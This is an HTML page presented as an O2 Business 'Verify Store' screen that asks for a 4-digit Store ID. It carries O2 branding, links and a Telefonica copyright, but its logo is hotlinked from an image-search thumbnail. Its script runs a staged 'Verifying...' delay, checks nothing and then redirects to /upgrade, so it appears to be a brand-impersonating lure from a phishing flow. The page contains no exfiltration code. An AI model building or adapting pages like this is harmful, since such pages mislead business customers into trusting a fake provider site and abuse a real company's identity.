<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify Store | O2 Business</title>
    <link rel="stylesheet" href="/css/main.css">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
</head>
<body>
    <header class="o2-header">
        <div class="header-container">
            <a href="https://www.o2.co.uk" class="logo-link">
                <img src="https://imgs.search.brave.com/_8uWRUTQLMKrInHR3bwZc36sUEVpozrXMOduCXBaepw/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly8xMDAw/bG9nb3MubmV0L3dw/LWNvbnRlbnQvdXBs/b2Fkcy8yMDE4LzA3/L08yLUxvZ28tNTAw/eDI4MS5wbmc" alt="O2" class="o2-logo-img">
            </a>
            <nav class="header-nav">
                <a href="https://www.o2.co.uk/shop" class="header-link">Shop</a>
                <a href="https://www.o2.co.uk/connectivity" class="header-link">Business</a>
                <a href="https://www.o2.co.uk/help" class="header-link">Help</a>
            </nav>
        </div>
    </header>

    <main>
        <section class="store-section">
            <div class="section-inner">
                <h2>Enter your Store ID</h2>
                <p class="section-sub">Your 4-digit Store ID can be found on your O2 Business welcome letter or your store manager dashboard.</p>

                <div class="store-form">
                    <div class="store-inputs" id="storeInputs">
                        <input type="text" class="store-digit" maxlength="1" inputmode="numeric" pattern="[0-9]" data-index="0" autocomplete="off">
                        <input type="text" class="store-digit" maxlength="1" inputmode="numeric" pattern="[0-9]" data-index="1" autocomplete="off">
                        <input type="text" class="store-digit" maxlength="1" inputmode="numeric" pattern="[0-9]" data-index="2" autocomplete="off">
                        <input type="text" class="store-digit" maxlength="1" inputmode="numeric" pattern="[0-9]" data-index="3" autocomplete="off">
                    </div>
                    <p class="store-hint">Enter your 4-digit Store ID</p>
                    <button class="o2-continue-btn" id="continueBtn">
                        Continue
                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>
                    </button>
                </div>
            </div>
        </section>
    </main>

    <footer class="page-footer">
        <div class="footer-inner">
            <div class="footer-links">
                <a href="https://www.o2.co.uk/termsandconditions" class="footer-link">Terms &amp; Conditions</a>
                <a href="https://www.o2.co.uk/privacy" class="footer-link">Privacy Policy</a>
                <a href="https://www.o2.co.uk/help" class="footer-link">Help &amp; Support</a>
            </div>
            <p class="footer-copy">&copy; 2026 Telefonica UK Limited. All rights reserved.</p>
        </div>
    </footer>

    <script>
        (function() {
            var inputs = document.querySelectorAll('.store-digit');
            var continueBtn = document.getElementById('continueBtn');

            function checkComplete() {
                var allFilled = true;
                inputs.forEach(function(inp) {
                    if (!inp.value || !/^\d$/.test(inp.value)) {
                        allFilled = false;
                    }
                });
                if (allFilled) {
                    continueBtn.classList.add('o2-continue-btn--ready');
                } else {
                    continueBtn.classList.remove('o2-continue-btn--ready');
                }
            }

            inputs.forEach(function(input) {
                input.addEventListener('input', function(e) {
                    var val = this.value.replace(/[^0-9]/g, '');
                    this.value = val.slice(0, 1);
                    if (this.value) {
                        this.classList.add('filled');
                    } else {
                        this.classList.remove('filled');
                    }
                    checkComplete();

                    if (val && this.dataset.index < 3) {
                        var next = document.querySelector('.store-digit[data-index="' + (parseInt(this.dataset.index) + 1) + '"]');
                        if (next) next.focus();
                    }
                });

                input.addEventListener('keydown', function(e) {
                    if (e.key === 'Backspace' && !this.value && this.dataset.index > 0) {
                        var prev = document.querySelector('.store-digit[data-index="' + (parseInt(this.dataset.index) - 1) + '"]');
                        if (prev) { prev.focus(); prev.select(); }
                    }
                    if (e.key === 'ArrowLeft' && this.dataset.index > 0) {
                        var prev = document.querySelector('.store-digit[data-index="' + (parseInt(this.dataset.index) - 1) + '"]');
                        if (prev) prev.focus();
                    }
                    if (e.key === 'ArrowRight' && this.dataset.index < 3) {
                        var next = document.querySelector('.store-digit[data-index="' + (parseInt(this.dataset.index) + 1) + '"]');
                        if (next) next.focus();
                    }
                });

                input.addEventListener('paste', function(e) {
                    e.preventDefault();
                    var paste = (e.clipboardData || window.clipboardData).getData('text');
                    var digits = paste.replace(/[^0-9]/g, '').slice(0, 4).split('');
                    inputs.forEach(function(inp, i) {
                        inp.value = digits[i] || '';
                        if (digits[i]) inp.classList.add('filled');
                        else inp.classList.remove('filled');
                    });
                    checkComplete();
                    if (digits.length >= 4) {
                        inputs[3].focus();
                    }
                });
            });

            function doContinue() {
                if (!continueBtn.classList.contains('o2-continue-btn--ready')) return;

                continueBtn.textContent = 'Verifying...';
                continueBtn.disabled = true;

                setTimeout(function() {
                    window.location.href = '/upgrade';
                }, 800);
            }

            continueBtn.addEventListener('click', doContinue);

            inputs.forEach(function(input) {
                input.addEventListener('keydown', function(e) {
                    if (e.key === 'Enter') {
                        e.preventDefault();
                        doContinue();
                    }
                });
            });

            inputs[0].focus();
        })();
    </script>
</body>
</html>
